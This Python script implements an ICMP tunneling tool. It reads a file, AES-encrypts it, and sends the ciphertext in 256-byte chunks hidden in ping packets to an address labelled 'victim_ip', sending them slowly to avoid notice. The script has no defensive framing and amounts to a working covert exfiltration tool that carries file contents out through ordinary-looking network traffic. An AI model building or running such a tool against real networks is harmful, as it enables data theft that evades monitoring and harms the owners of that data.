from scapy.all import ICMP, IP, send

import aes
import sys
import threading
import time

MAX_DATA_SIZE = 256
SLEEP_SECONDS = 2


def print_line():
    print("-" * 40)


def ReLU(number: int) -> int:
    return max(0, number)


class ICMPTunneler:
    def __init__(self, victim_ip: str, file_path: str) -> None:
        self.victim_ip = victim_ip
        self.file_path = file_path

    def main_menu(self):
        with open("main_menu.txt", "r") as main_menu_file:
            print(main_menu_file.read())

    def send(self):
        ip = IP(dst=self.victim_ip)
        icmp = ICMP(type=8, code=0)

        buffer = b""

        with open(self.file_path, "rb") as file:
            file_data = file.read()
            file_size = len(file_data)

            aes_return = aes.aes_encrypt(file_data)

            buffer = aes_return.pack_bytes()
            buffer_size = len(buffer)

            packet_counter = 1

            print(f"[*] Initialing:")
            print(f"    - Source IP:        {ip.src}")
            print(f"    - Destination IP:   {ip.dst}")
            print(f"    - Data block size:  {MAX_DATA_SIZE} bytes")
            print(f"    - Encryption:       AES-{aes.AES_KEY_SIZE* 8} EAX")
            print_line()

            print(f"[*] Buffer size:        {buffer_size} bytes")
            print(f"    - Key size:         {aes.AES_KEY_SIZE} bytes")
            print(f"    - Nonce size:       {aes.AES_NONCE_SIZE} bytes")
            print(f"    - MAC Tag size:     {aes.AES_MAC_TAG_SIZE} bytes")
            print(f"    - File size:        {file_size} bytes")
            print_line()

            packets_to_send = (buffer_size // MAX_DATA_SIZE) + 1
            time_to_send = SLEEP_SECONDS * packets_to_send

            print(f"[*] Packets to send:    {packets_to_send}")
            print(f"[*] ~ time to send:     {time_to_send} s")
            print_line()

            for i in range(0, buffer_size, MAX_DATA_SIZE):
                try:
                    last_chunk = buffer_size - i == buffer_size % MAX_DATA_SIZE

                    if last_chunk:
                        packet = ip / icmp / buffer[i:]
                    else:
                        packet = ip / icmp / buffer[i : i + MAX_DATA_SIZE]

                    send(packet, verbose=False)

                    remaining = ReLU(buffer_size - (i + MAX_DATA_SIZE))

                    print(
                        f"[*] Packet {packet_counter} sent.     {remaining} bytes remaining ..."
                    )
                    packet_counter += 1

                    time.sleep(SLEEP_SECONDS)

                except KeyboardInterrupt:
                    print("Keyboard interruption. Quiting ...")
                    sys.exit()

    def sniff(self):
        pass

    def run(self, must_sniff: bool = False):
        self.main_menu()
        print_line()

        self.send_thread = threading.Thread(target=self.send)
        self.send_thread.start()

        if must_sniff:
            self.sniff_thread = threading.Thread(target=self.sniff)
            self.sniff_thread.start()


def main():
    victim_ip = sys.argv[1]
    file_path = sys.argv[2]

    icmp_tunneler = ICMPTunneler(victim_ip, file_path)
    icmp_tunneler.run()


if __name__ == "__main__":
    main()
